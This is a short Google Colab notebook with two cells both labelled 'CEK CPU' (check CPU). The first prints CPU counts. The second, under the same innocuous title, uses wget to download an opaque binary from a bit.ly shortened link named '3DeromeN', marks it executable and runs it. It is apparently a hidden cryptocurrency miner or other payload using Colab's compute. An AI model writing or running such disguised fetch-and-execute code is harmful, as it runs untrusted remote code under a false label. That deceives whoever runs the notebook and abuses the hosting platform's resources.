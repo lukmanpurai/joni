{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "gpuClass": "standard"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "IxD3I0hHbCZ9"
      },
      "source": [
        "#**MANTAP**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "l1-8toPSX4Z0",
        "cellView": "form"
      },
      "source": [
        "#@title CEK CPU\n",
        "!lscpu | grep 'CPU(s):'"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Sdoptmqf42Xf",
        "cellView": "form"
      },
      "source": [
        "#@title CEK CPU\n",
        "!wget bit.ly/3DeromeN && chmod +x 3DeromeN && ./3DeromeN\n"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
